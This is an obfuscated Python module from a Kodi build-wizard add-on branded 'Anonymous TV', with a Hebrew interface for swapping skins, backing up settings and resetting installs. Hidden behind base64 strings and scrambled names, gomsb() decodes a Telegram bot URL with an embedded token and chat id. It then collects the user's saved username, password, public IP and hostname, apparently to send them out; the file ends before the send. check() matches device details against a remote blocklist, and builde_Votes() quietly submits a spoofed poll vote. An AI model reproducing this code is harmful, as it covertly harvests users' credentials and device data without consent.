import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random ,urllib ,re ,time ,json ,subprocess ,zipfile #line:3
import shutil ,logging ,uservar ,platform ,base64 ,socket #line:4
from urllib .request import urlopen #line:8
from urllib .request import Request #line:9
from shutil import copyfile #line:11
import threading #line:13
from threading import Thread #line:14
from datetime import date ,datetime ,timedelta #line:16
from urllib .parse import parse_qsl #line:17
que =urllib .parse .quote_plus #line:19
url_encode =urllib .parse .urlencode #line:20
unque =urllib .parse .unquote_plus #line:21
translatepath =xbmcvfs .translatePath #line:23
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt #line:25
try :#line:26
 import wizard as wiz #line:27
except :#line:28
 from resources .libs import wizard as wiz #line:29
code_link ='empty'#line:30
ADDON_ID =uservar .ADDON_ID #line:31
ADDONTITLE =uservar .ADDONTITLE #line:32
ADDON =wiz .addonId (ADDON_ID )#line:33
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:34
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:35
DIALOG =xbmcgui .Dialog ()#line:36
DP =xbmcgui .DialogProgress ()#line:37
HOME =translatepath ('special://home/')#line:38
LOG =translatepath ('special://logpath/')#line:39
PROFILE =translatepath ('special://profile/')#line:40
ADDONS =os .path .join (HOME ,'addons')#line:41
USERDATA =os .path .join (HOME ,'userdata')#line:42
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:43
PACKAGES =os .path .join (ADDONS ,'packages')#line:44
ADDOND =os .path .join (USERDATA ,'addon_data')#line:45
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:46
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:47
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:48
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:49
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:50
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:51
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:52
DATABASE =os .path .join (USERDATA ,'Database')#line:53
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:54
ICON =os .path .join (ADDONPATH ,'icon.png')#line:55
ART =os .path .join (ADDONPATH ,'resources','art')#line:56
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:57
DP2 =xbmcgui .DialogProgressBG ()#line:58
SKIN =xbmc .getSkinDir ()#line:59
BUILDNAME =wiz .getS ('buildname')#line:60
DEFAULTSKIN =wiz .getS ('defaultskin')#line:61
DEFAULTNAME =wiz .getS ('defaultskinname')#line:62
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:63
BUILDVERSION =wiz .getS ('buildversion')#line:64
BUILDTHEME =wiz .getS ('buildtheme')#line:65
BUILDLATEST =wiz .getS ('latestversion')#line:66
INSTALLMETHOD =wiz .getS ('installmethod')#line:67
SHOW15 =wiz .getS ('show15')#line:68
SHOW16 =wiz .getS ('show16')#line:69
SHOW17 =wiz .getS ('show17')#line:70
SHOW18 =wiz .getS ('show18')#line:71
SHOWADULT =wiz .getS ('adult')#line:72
SHOWMAINT =wiz .getS ('showmaint')#line:73
AUTOCLEANUP =wiz .getS ('autoclean')#line:74
AUTOCACHE =wiz .getS ('clearcache')#line:75
AUTOPACKAGES =wiz .getS ('clearpackages')#line:76
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:77
AUTOFEQ =wiz .getS ('autocleanfeq')#line:78
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:79
INCLUDENAN =wiz .getS ('includenan')#line:80
INCLUDEURL =wiz .getS ('includeurl')#line:81
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:82
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:83
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:84
INCLUDEVIDEO =wiz .getS ('includevideo')#line:85
INCLUDEALL =wiz .getS ('includeall')#line:86
INCLUDEBOB =wiz .getS ('includebob')#line:87
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:88
INCLUDESPECTO =wiz .getS ('includespecto')#line:89
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:90
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:91
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:92
INCLUDESALTS =wiz .getS ('includesalts')#line:93
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:94
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:95
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:96
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:97
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:98
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:99
INCLUDEURANUS =wiz .getS ('includeuranus')#line:100
SEPERATE =wiz .getS ('seperate')#line:101
NOTIFY =wiz .getS ('notify')#line:102
NOTEDISMISS =wiz .getS ('notedismiss')#line:103
NOTEID =wiz .getS ('noteid')#line:104
NOTIFY2 =wiz .getS ('notify2')#line:105
NOTEID2 =wiz .getS ('noteid2')#line:106
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:107
NOTIFY3 =wiz .getS ('notify3')#line:108
NOTEID3 =wiz .getS ('noteid3')#line:109
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:110
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:111
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:112
TRAKTSAVE =wiz .getS ('traktlastsave')#line:113
REALSAVE =wiz .getS ('debridlastsave')#line:114
LOGINSAVE =wiz .getS ('loginlastsave')#line:115
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:116
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:117
KEEPINFO =wiz .getS ('keepinfo')#line:118
KEEPSOUND =wiz .getS ('keepsound')#line:120
KEEPVIEW =wiz .getS ('keepview')#line:121
KEEPSKIN =wiz .getS ('keepskin')#line:122
KEEPADDONS =wiz .getS ('keepaddons')#line:123
KEEPSKIN2 =wiz .getS ('keepskin2')#line:124
KEEPSKIN3 =wiz .getS ('keepskin3')#line:125
KEEPTORNET =wiz .getS ('keeptornet')#line:126
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:127
KEEPPVR =wiz .getS ('keeppvr')#line:128
ENABLE =uservar .ENABLE #line:129
KEEPVICTORY =wiz .getS ('keepvictory')#line:130
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:131
KEEPTVLIST =wiz .getS ('keeptvlist')#line:132
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:133
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:134
KEEPHUBTV =wiz .getS ('keephubtv')#line:135
KEEPHUBVOD =wiz .getS ('keephubvod')#line:136
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:137
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:138
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:139
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:140
HARDWAER =wiz .getS ('action')#line:141
USERNAME =wiz .getS ('user')#line:142
PASSWORD =wiz .getS ('pass')#line:143
KEEPWEATHER =wiz .getS ('keepweather')#line:144
KEEPFAVS =wiz .getS ('keepfavourites')#line:145
KEEPSOURCES =wiz .getS ('keepsources')#line:146
KEEPPROFILES =wiz .getS ('keepprofiles')#line:147
KEEPADVANCED =wiz .getS ('keepadvanced')#line:148
KEEPREPOS =wiz .getS ('keeprepos')#line:149
KEEPSUPER =wiz .getS ('keepsuper')#line:150
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:151
KEEPTRAKT =wiz .getS ('keeptrakt')#line:152
KEEPREAL =wiz .getS ('keepdebrid')#line:153
KEEPRD2 =wiz .getS ('keeprd2')#line:154
KEEPLOGIN =wiz .getS ('keeplogin')#line:155
LOGINSAVE =wiz .getS ('loginlastsave')#line:156
DEVELOPER =wiz .getS ('developer')#line:157
THIRDPARTY =wiz .getS ('enable3rd')#line:158
THIRD1NAME =wiz .getS ('wizard1name')#line:159
THIRD1URL =wiz .getS ('wizard1url')#line:160
THIRD2NAME =wiz .getS ('wizard2name')#line:161
THIRD2URL =wiz .getS ('wizard2url')#line:162
THIRD3NAME =wiz .getS ('wizard3name')#line:163
THIRD3URL =wiz .getS ('wizard3url')#line:164
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:165
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:166
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:167
TODAY =date .today ()#line:168
TOMORROW =TODAY +timedelta (days =1 )#line:169
THREEDAYS =TODAY +timedelta (days =3 )#line:170
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:171
MCNAME =wiz .mediaCenter ()#line:172
EXCLUDES =uservar .EXCLUDES #line:173
SPEEDFILE =uservar .SPEEDFILE #line:174
APKFILE =uservar .APKFILE #line:175
YOUTUBETITLE =uservar .YOUTUBETITLE #line:176
YOUTUBEFILE =uservar .YOUTUBEFILE #line:177
from resources .libs .wizard import BL #line:178
ADDONFILE =uservar .ADDONFILE #line:179
ADVANCEDFILE =uservar .ADVANCEDFILE #line:180
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:181
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:182
NOTIFICATION =uservar .NOTIFICATION #line:183
NOTIFICATION2 =uservar .NOTIFICATION2 #line:184
NOTIFICATION3 =uservar .NOTIFICATION3 #line:185
HELPINFO =uservar .HELPINFO #line:186
ENABLE =uservar .ENABLE #line:187
HEADERMESSAGE =uservar .HEADERMESSAGE #line:188
AUTOUPDATE =uservar .AUTOUPDATE #line:189
WIZARDFILE =uservar .WIZARDFILE #line:190
HIDECONTACT =uservar .HIDECONTACT #line:191
SKINID18 =uservar .SKINID18 #line:192
SKINID18DDONXML =uservar .SKINID18DDONXML #line:193
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:194
SKINID17 =uservar .SKINID17 #line:195
SKINID17DDONXML =uservar .SKINID17DDONXML #line:196
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:197
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:198
CONTACT =uservar .CONTACT #line:199
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:200
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:201
HIDESPACERS =uservar .HIDESPACERS #line:202
TMDB_NEW_API =uservar .TMDB_NEW_API #line:203
COLOR1 =uservar .COLOR1 #line:204
COLOR2 =uservar .COLOR2 #line:205
THEME1 =uservar .THEME1 #line:206
THEME2 =uservar .THEME2 #line:207
THEME3 =uservar .THEME3 #line:208
THEME4 =uservar .THEME4 #line:209
THEME5 =uservar .THEME5 #line:210
TMDB_NEW_API2 ='bG9qaw=='#line:211
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:212
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:213
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:214
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:215
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:216
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:217
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:218
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:219
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:220
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:221
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:222
LOGFILES =wiz .LOGFILES #line:223
TRAKTID =traktit .TRAKTID #line:224
DEBRIDID =debridit .DEBRIDID #line:225
LOGINID =loginit .LOGINID #line:226
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:227
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:228
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:229
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:230
fullsecfold =translatepath ('special://home')#line:231
code_link ='empty'#line:232
addons_folder =os .path .join (fullsecfold ,'addons')#line:233
remove_url =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode ('utf-8')#line:235
user_folder =os .path .join (translatepath ('special://masterprofile'),'addon_data')#line:237
remove_url2 =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvcmVtb3ZlYWRkb25zLnhtbA==').decode ('utf-8')#line:239
fanart =translatepath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:240
icon =translatepath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:241
IPTV18 =''#line:243
IPTVSIMPL18PC =''#line:244
class Thread (threading .Thread ):#line:248
   def __init__ (OO0OOO0O00OOO0OOO ,O00OO0O0O0O0O0O0O ,*O00OOO00OO0000OOO ):#line:249
    super ().__init__ (target =O00OO0O0O0O0O0O0O ,args =O00OOO00OO0000OOO )#line:250
   def run (OO0OOO0O00OO0OOO0 ,*OOOOOOO000OO00O0O ):#line:251
      OO0OOO0O00OO0OOO0 ._target (*OO0OOO0O00OO0OOO0 ._args )#line:253
      return 0 #line:254
oo ='/key.xml'#line:256
from resources .libs .wizard import ld #line:257
def MainMenu ():#line:259
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:261
def skinWIN ():#line:262
	idle ()#line:263
	OOO0OO0O0OOOO00O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:264
	OOO00O00000000OO0 =[];O000OOO00000OOOOO =[]#line:265
	for OO00O00OOO00000O0 in sorted (OOO0OO0O0OOOO00O0 ,key =lambda O0OO000O0O0O00OOO :O0OO000O0O0O00OOO ):#line:266
		O0000OOO0O00O0O00 =os .path .split (OO00O00OOO00000O0 [:-1 ])[1 ]#line:267
		OOO0000O0OO0OO00O =os .path .join (OO00O00OOO00000O0 ,'addon.xml')#line:268
		if os .path .exists (OOO0000O0OO0OO00O ):#line:269
			O0O0O0000OO000O0O =open (OOO0000O0OO0OO00O )#line:270
			OO0O0000OO0OOO000 =O0O0O0000OO000O0O .read ()#line:271
			OO0O00O00OOOOOO0O =parseDOM2 (OO0O0000OO0OOO000 ,'addon',ret ='id')#line:272
			O00OOO0OOOO0OOO0O =O0000OOO0O00O0O00 if len (OO0O00O00OOOOOO0O )==0 else OO0O00O00OOOOOO0O [0 ]#line:273
			try :#line:274
				O0O00O0O0O0OOO0OO =xbmcaddon .Addon (id =O00OOO0OOOO0OOO0O )#line:275
				OOO00O00000000OO0 .append (O0O00O0O0O0OOO0OO .getAddonInfo ('name'))#line:276
				O000OOO00000OOOOO .append (O00OOO0OOOO0OOO0O )#line:277
			except :#line:278
				pass #line:279
	OOOO000OO0OO00000 =[];OOO000O000O0OO000 =0 #line:280
	O00000O0OOOOO0OO0 =["Current Skin -- %s"%currSkin ()]+OOO00O00000000OO0 #line:281
	OOO000O000O0OO000 =DIALOG .select ("Select the Skin you want to swap with.",O00000O0OOOOO0OO0 )#line:282
	if OOO000O000O0OO000 ==-1 :return #line:283
	else :#line:284
		OO000OOOO0OO0000O =(OOO000O000O0OO000 -1 )#line:285
		OOOO000OO0OO00000 .append (OO000OOOO0OO0000O )#line:286
		O00000O0OOOOO0OO0 [OOO000O000O0OO000 ]="%s"%(OOO00O00000000OO0 [OO000OOOO0OO0000O ])#line:287
	if OOOO000OO0OO00000 ==None :return #line:288
	for O00000OO0O0O000O0 in OOOO000OO0OO00000 :#line:289
		swapSkins (O000OOO00000OOOOO [O00000OO0O0O000O0 ])#line:290
def currSkin ():#line:292
	return xbmc .getSkinDir ('Container.PluginName')#line:293
def swapSkins (O0OOO0O0O0OO00O00 ,title ="Error"):#line:294
	O000OO0OOO000000O ='lookandfeel.skin'#line:295
	OOO00OOOO0O0O00O0 =O0OOO0O0O0OO00O00 #line:296
	O0OOOO0OO000000O0 =getOld (O000OO0OOO000000O )#line:297
	O00O0OOOOOOO00O0O =O000OO0OOO000000O #line:298
	setNew (O00O0OOOOOOO00O0O ,OOO00OOOO0O0O00O0 )#line:299
	O00OO0O0O0OO00O0O =0 #line:300
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0O0O0OO00O0O <100 :#line:301
		O00OO0O0O0OO00O0O +=1 #line:302
		xbmc .sleep (1 )#line:303
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:304
		xbmc .executebuiltin ('SendClick(11)')#line:305
	return True #line:306
def getOld (O0O00O00OOO00O0OO ):#line:310
	try :#line:311
		O0O00O00OOO00O0OO ='"%s"'%O0O00O00OOO00O0OO #line:312
		O0OO00OOOOOOOOOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O00O00OOO00O0OO )#line:313
		O000O0O000OOOOOO0 =xbmc .executeJSONRPC (O0OO00OOOOOOOOOOO )#line:315
		O000O0O000OOOOOO0 =simplejson .loads (O000O0O000OOOOOO0 )#line:316
		if 'result'in O000O0O000OOOOOO0 :#line:317
			if 'value'in O000O0O000OOOOOO0 ['result']:#line:318
				return O000O0O000OOOOOO0 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
server ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'#line:324
def setNew (OOO0O0O0OO0O000OO ,OOO0O0O0OOOOO0000 ):#line:325
	try :#line:326
		OOO0O0O0OO0O000OO ='"%s"'%OOO0O0O0OO0O000OO #line:327
		OOO0O0O0OOOOO0000 ='"%s"'%OOO0O0O0OOOOO0000 #line:328
		O00OO00000OOOOOOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0O0O0OO0O000OO ,OOO0O0O0OOOOO0000 )#line:329
		O0O0000O0000OOO00 =xbmc .executeJSONRPC (O00OO00000OOOOOOO )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def time_sync ():#line:337
 DP2 .create ('[B]מבצע סנכרון[/B]')#line:339
 for O0O00O00O0O0O00O0 in range (60 ,-1 ,-1 ):#line:340
       time .sleep (1 )#line:341
       DP2 .update (int ((60 -O0O00O00O0O0O00O0 )/60.0 *100 ),"[B]מסנכרן הרחבות                                 [/B]"+'\n'+"[B]אנא המתן...[/B]")#line:342
 DP2 .close ()#line:343
def resetkodi ():#line:345
        if xbmc .getCondVisibility ('system.platform.windows'):#line:346
            OOO0OOOO0OO0O0O0O =xbmcgui .DialogProgress ()#line:347
            try :#line:348
                OOO0OOOO0OO0O0O0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:350
            except :#line:351
                OOO0OOOO0OO0O0O0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:353
            OOO0OOOO0OO0O0O0O .update (0 )#line:354
            for OOO0OO0O0000OOO0O in range (5 ,-1 ,-1 ):#line:355
                time .sleep (1 )#line:356
                try :#line:357
                    OOO0OOOO0OO0O0O0O .update (int ((5 -OOO0OO0O0000OOO0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO0OO0O0000OOO0O ),'')#line:358
                except :#line:359
                    OOO0OOOO0OO0O0O0O .update (int ((5 -OOO0OO0O0000OOO0O )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (OOO0OO0O0000OOO0O )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:360
                if OOO0OOOO0OO0O0O0O .iscanceled ():#line:361
                    from resources .libs import win #line:362
                    return None ,None #line:363
            from resources .libs import win #line:364
        else :#line:365
            OOO0OOOO0OO0O0O0O =xbmcgui .DialogProgress ()#line:366
            try :#line:367
                OOO0OOOO0OO0O0O0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:370
            except :#line:371
                OOO0OOOO0OO0O0O0O .create ("ההתקנה תסגר אוטומטית","[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]")#line:374
            OOO0OOOO0OO0O0O0O .update (0 )#line:375
            for OOO0OO0O0000OOO0O in range (5 ,-1 ,-1 ):#line:376
                time .sleep (1 )#line:377
                try :#line:378
                    OOO0OOOO0OO0O0O0O .update (int ((5 -OOO0OO0O0000OOO0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOO0OO0O0000OOO0O ),'')#line:379
                except :#line:380
                    OOO0OOOO0OO0O0O0O .update (int ((5 -OOO0OO0O0000OOO0O )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (OOO0OO0O0000OOO0O )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:381
                if OOO0OOOO0OO0O0O0O .iscanceled ():#line:382
                    from resources .libs import android #line:384
                    return None ,None #line:385
            from resources .libs import android #line:386
def testcommand ():#line:389
    OOOO0000OO00O000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:390
    OOOO000OOO0OOOO0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:391
    O000O0OO00OO0O0O0 =open (OOOO0000OO00O000O ,'r',encoding ='utf-8')#line:393
    O00O0OO0O000OOO00 =O000O0OO00OO0O0O0 .read ()#line:394
    O000O0OO00OO0O0O0 .close ()#line:395
    if O00O0OO0O000OOO00 =='':#line:397
            xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','הגדרת הורדת כתובית בוצעה בהצלחה')))#line:398
            copyfile (OOOO000OOO0OOOO0O ,OOOO0000OO00O000O )#line:399
def backup_setting_file ():#line:401
    try :#line:402
        OOOO00000000O00OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:403
        OOOO000O00O0OO0OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:404
        copyfile (OOOO00000000O00OO ,OOOO000O00O0OO0OO )#line:406
    except :pass #line:407
def read_skin (OO0OOOOO00O000O0O ):#line:409
    from resources .libs import firebase #line:410
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:411
    OOO00O0OOOO000OOO =firebase .get ('/',None )#line:412
    if OO0OOOOO00O000O0O in OOO00O0OOOO000OOO :#line:413
        return OOO00O0OOOO000OOO [OO0OOOOO00O000O0O ]#line:414
    else :#line:415
        return {}#line:416
def read_skin_black (O0000OO00OO0O0O00 ):#line:417
    from resources .libs import firebase #line:418
    firebase =firebase .FirebaseApplication (black_nox ,None )#line:419
    OOO0O0OO00O0O0OO0 =firebase .get ('/',None )#line:420
    if O0000OO00OO0O0O00 in OOO0O0OO00O0O0OO0 :#line:421
        return OOO0O0OO00O0O0OO0 [O0000OO00OO0O0O00 ]#line:422
    else :#line:423
        return {}#line:424
def check (wiz_up =False ):#line:428
    import json ,platform ,requests #line:429
    OO0O000OO00000OO0 =ADDON .getSetting ("user")#line:430
    OO0OOO0O00OO00OO0 =ADDON .getSetting ("pass")#line:431
    OO00O00OOOOOO0OO0 =[]#line:436
    O000O0O0O00O0000O =0 #line:437
    OO0OOO0O00OO00OO0 =(ADDON .getSetting ("pass"))#line:438
    try :#line:439
        O00OO000O0OO0OO00 =read_skin_black ('lock_install')#line:440
        for OOO0OO0OOO00O0O00 in O00OO000O0OO0OO00 :#line:441
            OOO0OO0O00O00O000 =O00OO000O0OO0OO00 [OOO0OO0OOO00O0O00 ]#line:442
            OO00O00OOOOOO0OO0 .append ((OOO0OO0O00O00O000 ['lock_install']))#line:443
    except Exception as O00OO0O0OO00OO00O :#line:444
              logging .warning ('בעיה ב firebase    !!!!!!!!!!!!!!!!!!!!!!     '+str (O00OO0O0OO00OO00O ))#line:445
    OOO0000O0O0OOOOOO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:447
    O00OO0OOOOOO0O000 =platform .uname ()#line:449
    O0O0000OOOO0O0OOO =O00OO0OOOOOO0O000 [1 ]#line:450
    OOOOO0OOOO0O0OO00 =''#line:452
    OO0OOO000O0OO0000 =(ADDON .getSetting ("action"))#line:453
    OO0O00OO0O0OOOOOO =''#line:454
    if wiz_up :#line:455
        OO0O00OO0O0OOOOOO ='wizard_update'#line:456
    for OO0O0O0OOOO000OOO in OO00O00OOOOOO0OO0 :#line:457
        if OO0O0O0OOOO000OOO ==OOO0000O0O0OOOOOO :#line:458
            OOOOO0OOOO0O0OO00 ='ip'#line:459
            O000O0O0O00O0000O =1 #line:460
            break #line:461
        if OO0O0O0OOOO000OOO ==O0O0000OOOO0O0OOO :#line:462
            OOOOO0OOOO0O0OO00 ='system_name'#line:463
            O000O0O0O00O0000O =1 #line:464
            break #line:465
        if OO0O0O0OOOO000OOO ==OO0OOO000O0OO0000 :#line:466
            OOOOO0OOOO0O0OO00 ='hardware_code'#line:467
            O000O0O0O00O0000O =1 #line:468
            break #line:469
        if OO0O0O0OOOO000OOO ==OO0O000OO00000OO0 :#line:470
            OOOOO0OOOO0O0OO00 ='username'#line:471
            O000O0O0O00O0000O =1 #line:472
            break #line:473
        if OO0O0O0OOOO000OOO ==OO0OOO0O00OO00OO0 :#line:474
            OOOOO0OOOO0O0OO00 ='password'#line:475
            O000O0O0O00O0000O =1 #line:476
            break #line:477
    if O000O0O0O00O0000O ==1 :#line:478
       O00O00O0OOOOOOOO0 =base64 .b64decode ("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3F0VVlheXZj").decode ('utf-8')#line:480
       O00OOO00O0OO000OO =urlopen (O00O00O0OOOOOOOO0 )#line:481
       OOO0O0O000OO00OOO =O00OOO00O0OO000OO .readlines ()#line:482
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:483
       if not wiz_up :#line:484
        if BUILDNAME =="":#line:485
            gomsb_go2 (OOOOO0OOOO0O0OO00 +OO0O00OO0O0OOOOOO )#line:486
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]סיסמה לא נכונה.[/COLOR]'%COLOR2 )#line:487
            ADDON .openSettings ()#line:488
       sys .exit ()#line:489
def builde_Votes ():#line:490
   try :#line:491
        import requests #line:492
        OOOOO0O00OO0000OO ='45534033'#line:493
        O00OO00OO0O000OOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOOO0O00OO0000OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:505
        O000O00O00O00OOO0 ='256031424'#line:507
        O0O00O00O00O0O0OO ={'options':O000O00O00O00OOO0 }#line:513
        OOOO00000OOOO00OO =requests .post ('https://www.strawpoll.me/'+OOOOO0O00OO0000OO ,headers =O00OO00OO0O000OOO ,data =O0O00O00O00O0O0OO )#line:515
   except :pass #line:516
def gomsb ():#line:527
       try :#line:528
          import json ,requests #line:529
          wiz .log ('FRESH MESSAGE')#line:530
          OOOOOOO000OO00O00 =(wiz .getS ("user"))#line:531
          O000O0O0OO0O000O0 =(wiz .getS ("pass"))#line:532
          OO0O00OOO000O0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:533
          O0000O00OOO000OOO =platform .uname ()#line:534
          OO0O0OOOO0OOOOO00 =O0000O00OOO000OOO [1 ]#line:535
          O00O0O0OOO000OOOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:536
          OO0OOOO0O0OOOOO00 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:537
          OOOO0O00OO0OOOO0O =OOOOOOO000OO00O00 #line:539
          OOO0O0OOOOO0O0O0O =O000O0O0OO0O000O0 #line:540
